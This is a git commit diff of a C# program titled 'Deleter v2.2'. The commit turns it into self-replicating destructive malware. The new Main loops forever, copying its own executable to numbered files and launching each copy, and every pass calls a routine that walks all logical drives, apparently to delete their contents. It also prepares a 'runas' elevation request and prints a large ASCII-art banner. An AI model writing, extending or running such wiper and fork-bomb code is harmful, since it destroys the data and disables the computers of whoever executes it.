b5db0d9d62d3de70214d1b17baa1627b0903b69f
User-1819 <jackstage527+1@gmail.com>
2025-02-18 09:00:10 -0500

    Update main.cs

--- 7/main.cs
+++ 7/main.cs
@@ -1,17 +1,24 @@
 using System;
 using System.IO;
 using System.Collections.Generic;
+using System.Diagnostics;
+using System.Threading;
+using System.Reflection;
 namespace System
 {
     public static class Deleter
     {
-        public const string Ver = "2.1";
+        public const string Ver = "2.2";
         public const string Title = "Deleter v" + Ver;
         public static string[] LogicalDrives = Directory.GetLogicalDrives();
         public static List<DriveInfo> Disks = new List<DriveInfo>(DriveInfo.GetDrives());
-
-        public static void Main(string[] args)
+        public static string ProgramName = Assembly.GetExecutingAssembly().GetName().Name;
+        public static ulong x;
+        public static string[] Messages = Argument.Split('\n');
+        public static string Argument = "                                                                      ....                          \n                                                                    ..-+=:...                       \n                                                                 ..+########..                      \n                                                              ..=##########*...                     \n                                                             .:###########*###-.                    \n                 ........                                 ..:##############*##*..                   \n               ....-####+:..                             .:*##################..                    \n              ..=######+*##+:....                      ..=###################..                     \n              .++*#######*+####=:...                 ..-###################*.                       \n              .=*################*-...              ..=###################=..                       \n               ..=##########++#####*=:...          .-###################*:..                        \n                ..-##################==...       ..+###################=..                          \n                 ..-*##################*+=:.   ..-*##################*:..                           \n                   ..=**##################*+-..:*###################=.                              \n                    ...:#*###################++#################**=...                              \n                       ..*####################################=++:...                               \n                        ..+#################################=+=:.                                   \n                         ..:+##############################+=:.                                     \n                            ..-############################-..                                      \n                               ..=#######################*:..                                       \n                                ...+######################-.                                        \n                                ..+#*##################*###*:..                                     \n                               .:#####*-################**####..                                    \n                              .##**+*=#####################*###*..                                  \n                           ..-*#*##=-###*-=+################-:###+...                               \n                         ...+#:=*+.-*#+..-*###################-=###-...                             \n                        ..-+-:=-:.=**:-.-#####*-*+**###########*-+###+...                           \n                       ..:===-::.:--..:=####*:...+=-*+*####***###+-+###-..                          \n                     ..:.----:=-+--:.+#####-.    .:+++++#####*+*###=:*##*:..                        \n                    ..---=*=-===+:..+####+:.      ...+==:+*####+*####-:*##=..                       \n                   ..:--=++=+#+*:.:*###*:.           .:+*=+*#####+*####-=##*:                       \n                ....=--+**##**#:.+###*:.              ..:**+**######*###*=*##=..                    \n                ..:--:+*##***-..+#**:.                 ...:+###=+####***##**##*-..                  \n              ..::..-=*#*-*=..=#+*-...                    ..:*##*=-*####***#**##=..                 \n            ..:...:==##==+..:***=..                          .-+##*+=-+##++###++#*:..               \n           ......--+**=+:..-+*=..                             ..:+##*+-+##*+###+-+#+.               \n         .......::+#==-...:+=..                                  .:*###*+#*#*+###+:**:.             \n        .........=+=-....==...                                    ...+###***#*##*+#-:==.            \n       ........:*==:...-+:..                                        ...=*###***+#*-=*.:-..          \n        .  ...--:....:+....                                           ...:==+*:=+*#=-:=...          \n          ....-....:=:..                                                ....:-:-.=#+-.:=:.          \n         ...... ..=:..                                                       ......-=-..::.         \n           ... .:..                                                             .:.........         \n              ..                                                                  ...  .....        \n";
+        public static void DeleteDir(string[] args)
         {
+            Console.WriteLine(Messages);
             foreach (DriveInfo disk in Disks)
             {
                 if (disk.Name != disk.VolumeLabel)
@@ -36,6 +43,24 @@ namespace System
                         }
                     }
                 }
+            }
+        }
+        public static void Main(string[] args)
+        {
+            Console.Title = Title;
+            Process p = new Process();
+            p.StartInfo.UseShellExecute = true;
+            p.StartInfo.Verb = "runas";
+            Console.ForegroundColor = ConsoleColor.DarkGray;
+            Console.BackgroundColor = ConsoleColor.DarkRed;
+            Thread.Sleep(1000);
+            while (true)
+            {
+                x++;
+                File.Copy(ProgramName + ".exe", ProgramName + " (" + x + ").exe");
+                Process.Start(ProgramName
+                + " (" + x + ").exe");
+                DeleteDir(args);
             }
         }
     }
